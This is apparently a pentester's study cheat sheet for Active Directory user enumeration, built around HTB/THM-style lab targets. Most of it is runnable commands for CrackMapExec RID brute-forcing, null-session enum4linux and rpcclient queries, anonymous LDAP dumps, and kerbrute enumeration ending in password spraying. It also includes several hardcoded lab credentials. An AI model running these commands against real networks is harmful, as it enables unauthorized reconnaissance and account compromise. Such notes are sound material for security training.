#AD_user_enumeration

## <span style="color:#8BE9FD">User Enumeration (`crackmapexec --rid-brute`)</span>

> [!info] Variables used below
> - `$VICTIM_IP` – target machine's IP
> - `$DC_IP` – Domain Controller's IP
> - `$DOMAIN` – target domain name

It tells **CrackMapExec**:

> “Try RID numbers from 500 to 5500 and give me usernames if any match.”

### <span style="color:#50FA7B">Why This Works:</span>

- In Active Directory, **each user and group has a unique ID** called a **RID** (Relative Identifier).
- These RIDs are just numbers (like 500 = Administrator, 501 = Guest, etc.)
- On many networks, **user RIDs start at 1000 and go up** — like 1001, 1002, etc.

So if you **try each RID**, you might "guess" real usernames even if enumeration is blocked.

```bash
# Tries to find usernames without any login (anonymous).
crackmapexec smb $VICTIM_IP --rid-brute

# Tries to find usernames using the guest account (blank password).
crackmapexec smb $VICTIM_IP -u guest -p  '' --rid-brute

# Show only actual user accounts (not computer names or groups).
crackmapexec smb $VICTIM_IP -u guest -p  '' --rid-brute | grep SidTypeUser
```

___

# <span style="color:#FF5555">NULL Session to Pull User List</span>

##### <span style="color:#FFB86C">Using enum4linux</span>

```bash
# Pulls user list via null session, extracts just usernames
enum4linux -U $VICTIM_IP  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

enum4linux -a $VICTIM_IP > enum4linux.txt # Full scan
enum4linux -u "guest" -p "" $VICTIM_IP # Test guest access
enum4linux -u thm.corp\\\\guest -a $VICTIM_IP # enumerating using the Guest account

enum4linux-ng -A $VICTIM_IP -u FLUFFY/j.fleischman -p 'J0elTHEM4n1990!'
```
##### <span style="color:#FFB86C">Using rpcclient</span>
```bash
# Opens null session RPC connection
rpcclient -U "" -N $VICTIM_IP

# Lists all domain users (run inside rpcclient)
rpcclient $> enumdomusers
```
##### <span style="color:#FFB86C">Using CrackMapExec --users Flag</span>
```bash
# Lists users without credentials
crackmapexec smb $VICTIM_IP --users

# Lists all domain users using valid credentials
crackmapexec smb $VICTIM_IP -u htb-student -p Academy_student_AD! --users
```

___
# <span style="color:#FF5555">Gathering Users with LDAP Anonymous</span>
##### <span style="color:#FFB86C">Using ldapsearch</span>
```bash
# Searches for all user objects anonymously
ldapsearch -h $DC_IP -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

ldapsearch -x -H ldap://$DC_IP -b "dc=htb,dc=support" > ldap_dump.txt
# then search for keyword "LegacyPwd" it maycontain password

# search for "info" keyword it is password sometime and the name is user
ldapsearch -x -H ldap://$DC_IP -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" > ldap.search

# Finding user 
nxc ldap $DC_IP -u '' -p '' --users
nxc ldap $DC_IP -u 'guest' -p '' --users
```
##### <span style="color:#FFB86C">Using windapsearch</span>
```bash
# Python tool for anonymous LDAP user enumeration
./windapsearch.py --dc-ip $DC_IP -u "" -U
```

___
# <span style="color:#FF5555">Enumerating Users with Kerbrute</span>

We will use the word-list [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) to enumerate users
```bash
# Enumerates valid users by checking Kerberos pre-authentication
kerbrute userenum -d $DOMAIN --dc $DC_IP /opt/jsmith.txt

# bruteforcing the passwords for user ksimpson
kerbrute passwordspray -d $DOMAIN --dc $DC_IP /opt/jsmith.txt ksimpson
```
